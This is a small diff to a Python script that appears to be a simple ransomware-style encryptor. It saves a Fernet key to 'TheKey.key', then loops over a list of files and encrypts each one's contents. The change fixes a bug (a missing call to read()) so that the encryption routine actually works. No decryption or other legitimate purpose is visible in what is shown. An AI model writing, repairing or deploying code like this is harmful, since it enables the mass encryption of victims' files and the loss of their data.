@@ -18,8 +18,8 @@ with open("TheKey.key", "wb") as thekey:
 
 
 for file in files:
-    with open(file, 'rb') as theFile:
-        contentOfFiles = theFile.read
+    with open(file, "rb") as theFile:
+        contentOfFiles = theFile.read()
     #Encrypt data
     encryptedContent = Fernet(key).encrypt(contentOfFiles)
 
